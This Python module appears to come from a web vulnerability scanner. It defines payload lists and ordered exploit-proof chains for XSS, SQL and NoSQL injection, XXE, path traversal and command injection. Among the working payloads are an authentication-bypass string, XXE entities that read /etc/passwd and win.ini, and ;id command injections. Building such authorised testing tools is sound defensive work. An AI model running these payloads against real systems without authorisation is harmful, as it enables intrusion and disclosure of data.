"""Recommended payloads (manual) and Active Test exploit-chain cases.
Each vuln_type is an ordered chain. Active Test runs steps in order.
A later step is evidence of exploitation only if an earlier step already
matched. These are authorised proof chains, not a full dump of the database.
"""
from __future__ import annotations
RECOMMENDED_PAYLOADS: dict[str, list[str]] = {
    "XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "javascript:alert(1)",
    ],
    "XXE": [
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
    ],
    "NoSQLi": [
        '{"$ne": -1}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        "id[$ne]=",
    ],
    "SQLi": [
        "'",
        "';",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "1' UNION SELECT null--",
    ],
    "Path Traversal": [
        "../",
        "../../../../",
        "..%2f..%2f..%2f",
        "....//....//",
    ],
    "Command Injection": [
        "WEBSET_CANARY",
        ";WEBSET_CANARY",
        "|WEBSET_CANARY",
        ";id",
        "|id",
        "&id",
        ";echo WEBSET_CMD_OK",
    ],
    "Custom": [],
}
ACTIVE_TEST_LIBRARY: dict[str, list[dict]] = {
    "xss": [
        {
            "id": "xss_1_reach",
            "step": 1,
            "label": "XSS — input reaches the response",
            "marker": "TEST_MARKER_123",
            "expect": "reflection",
            "hint": "If the marker is absent, stop. The parameter is not a sink.",
        },
        {
            "id": "xss_2_unencoded",
            "step": 2,
            "label": "XSS — markup is not encoded",
            "marker": "<WebSET_ENC_789>",
            "expect": "raw_angle_brackets",
            "hint": "If < > come back as &lt; &gt;, the sink encodes and the chain stops.",
        },
        {
            "id": "xss_3_script",
            "step": 3,
            "label": "XSS — script tag delivered",
            "marker": "<script>alert(1)</script>",
            "expect": "raw_script",
            "hint": "Exploit step: a script tag is reflected raw in the page.",
        },
        {
            "id": "xss_4_breakout",
            "step": 4,
            "label": "XSS — attribute breakout",
            "marker": "\"><img src=x onerror=alert(1)>",
            "expect": "raw_breakout",
            "hint": "Exploit step if the sink is an HTML attribute.",
        },
        {
            "id": "xss_5_js_uri",
            "step": 5,
            "label": "XSS — javascript: URI",
            "marker": "<iframe src=\"javascript:alert(1)\">",
            "expect": "raw_js_uri",
            "hint": "Exploit step for DOM / href-src sinks that accept a javascript: URL.",
        },
    ],
    "sqli": [
        {
            "id": "sqli_1_break",
            "step": 1,
            "label": "SQLi — break the query",
            "marker": "'",
            "expect": "sql_error",
            "hint": "Quote closes a string. Confirmation = SQL / ORM error or 5xx, not a generic 400.",
        },
        {
            "id": "sqli_2_terminate",
            "step": 2,
            "label": "SQLi — terminate the statement",
            "marker": "';",
            "expect": "sql_error",
            "hint": "Shows the value is concatenated into SQL, not only validated.",
        },
        {
            "id": "sqli_3_boolean",
            "step": 3,
            "label": "SQLi — force the predicate true",
            "marker": "' OR '1'='1",
            "expect": "boolean",
            "hint": "OR 1=1 on a query/search field. Confirmation = error or a changed result set, not a login token.",
        },
        {
            "id": "sqli_4_auth",
            "step": 4,
            "label": "SQLi — authentication bypass",
            "marker": "' OR '1'='1'--",
            "expect": "auth_success",
            "context": "auth",
            "hint": (
                "Login fields only (email / username / password). "
                "The comment drops the password clause. "
                "Do not run this on search or product query parameters. "
                "Confirmation = token / session / user object, not an error page."
            ),
        },
        {
            "id": "sqli_5_union",
            "step": 5,
            "label": "SQLi — UNION syntax",
            "marker": "1' UNION SELECT null--",
            "expect": "sql_error_or_shape",
            "hint": "Proves SELECT injection. Null only — do not pull table data in the GUI probe.",
        },
    ],
    "nosqli": [
        {
            "id": "nosqli_1_ne",
            "step": 1,
            "label": "NoSQL — $ne operator object",
            "marker": "{\"$ne\": -1}",
            "expect": "nosql_operator",
            "hint": "Send the parameter as a document operator, not a quoted SQL fragment.",
        },
        {
            "id": "nosqli_2_gt",
            "step": 2,
            "label": "NoSQL — $gt operator object",
            "marker": "{\"$gt\": \"\"}",
            "expect": "nosql_operator",
            "hint": "Confirmation = modified count, success status, or a document-engine error.",
        },
        {
            "id": "nosqli_3_regex",
            "step": 3,
            "label": "NoSQL — $regex operator object",
            "marker": "{\"$regex\": \".*\"}",
            "expect": "nosql_operator",
            "hint": "Widens a lookup if the engine evaluates operators in user JSON.",
        },
    ],
    "xxe": [
        {
            "id": "xxe_1_file",
            "step": 1,
            "label": "XXE — external file entity",
            "marker": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
            "expect": "xxe_file",
            "hint": "Confirmation = local file marker or a parser entity error.",
        },
        {
            "id": "xxe_2_win",
            "step": 2,
            "label": "XXE — Windows file entity",
            "marker": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><r>&xxe;</r>",
            "expect": "xxe_file",
            "hint": "Same check for Windows deployments.",
        },
    ],
    "path_traversal": [
        {
            "id": "path_1_parent",
            "step": 1,
            "label": "Traversal — parent segment accepted",
            "marker": "../",
            "expect": "path_error_or_shift",
            "hint": "If ../ is stripped and the response is unchanged, stop.",
        },
        {
            "id": "path_2_depth",
            "step": 2,
            "label": "Traversal — leave the web root",
            "marker": "../../../../",
            "expect": "foreign_file_or_error",
            "hint": "Deeper climb. Confirmation = unexpected file text or filesystem error.",
        },
        {
            "id": "path_3_encoded",
            "step": 3,
            "label": "Traversal — encoded separator",
            "marker": "..%2f..%2f..%2f",
            "expect": "foreign_file_or_error",
            "hint": "Same climb if the app only filters literal ../.",
        },
        {
            "id": "path_4_wrap",
            "step": 4,
            "label": "Traversal — wrapped-dot bypass",
            "marker": "....//....//",
            "expect": "foreign_file_or_error",
            "hint": "Exploit step against naive string filters.",
        },
    ],
    "command_injection": [
        {
            "id": "cmd_1_canary",
            "step": 1,
            "label": "Command — value reaches a sink",
            "marker": "WEBSET_CANARY",
            "expect": "reflection_or_error",
            "hint": "If nothing changes, the parameter is not a command sink.",
        },
        {
            "id": "cmd_2_separator",
            "step": 2,
            "label": "Command — statement separator",
            "marker": ";WEBSET_CANARY",
            "expect": "shell_error_or_canary",
            "hint": "Separator plus canary. No destructive command.",
        },
        {
            "id": "cmd_3_pipe",
            "step": 3,
            "label": "Command — pipe separator",
            "marker": "|WEBSET_CANARY",
            "expect": "shell_error_or_canary",
            "hint": "Same check with a pipe if semicolon is filtered.",
        },
        {
            "id": "cmd_4_identity",
            "step": 4,
            "label": "Command — identity output",
            "marker": ";id",
            "expect": "command_output",
            "hint": "Non-destructive identity command. Confirmation = uid=/gid= in the response.",
        },
        {
            "id": "cmd_5_pipe_identity",
            "step": 5,
            "label": "Command — piped identity",
            "marker": "|id",
            "expect": "command_output",
            "hint": "Same identity check if only the pipe operator is accepted.",
        },
        {
            "id": "cmd_6_amp_identity",
            "step": 6,
            "label": "Command — background separator",
            "marker": "&id",
            "expect": "command_output",
            "hint": "Windows-style / background separator plus identity.",
        },
        {
            "id": "cmd_7_echo",
            "step": 7,
            "label": "Command — echo canary",
            "marker": ";echo WEBSET_CMD_OK",
            "expect": "command_output",
            "hint": "If identity is blocked, an echoed canary still proves command execution.",
        },
    ],
}
def get_payloads(payload_type: str) -> list[str]:
    return list(RECOMMENDED_PAYLOADS.get(payload_type, []) or [])
def _is_auth_finding(finding: dict | None) -> bool:
    if not finding:
        return False
    param = str(
        finding.get("param")
        or finding.get("input")
        or finding.get("parameter")
        or ""
    ).lower()
    url = str(
        finding.get("url")
        or finding.get("endpoint")
        or finding.get("location")
        or ""
    ).lower()
    name = str(finding.get("vulnerability") or finding.get("name") or "").lower()
    if param in ("email", "username", "user", "login", "password"):
        return True
    if any(tok in url for tok in ("/login", "/auth", "signin", "sign-in")):
        return True
    if "authentication" in name or "login" in name:
        return True
    return False
def get_active_tests(vuln_type: str, finding: dict | None = None) -> list[dict]:
    key = (vuln_type or "").lower().strip()
    if key in ("cmdi", "cmd", "os_command", "os command"):
        key = "command_injection"
    name = str((finding or {}).get("vulnerability") or (finding or {}).get("name") or "").lower()
    plugin = str((finding or {}).get("plugin_id") or "").lower()
    if key in ("nosqli", "nosql") or plugin == "nosqli" or "nosql" in name:
        key = "nosqli"
    if key == "xxe" or plugin == "xxe" or "external entity" in name or name.startswith("xxe") or " xxe" in name:
        key = "xxe"
    cases = list(ACTIVE_TEST_LIBRARY.get(key) or [])
    cases.sort(key=lambda c: int(c.get("step") or 0))
    if key == "sqli" and not _is_auth_finding(finding):
        cases = [c for c in cases if c.get("context") != "auth"]
    return cases
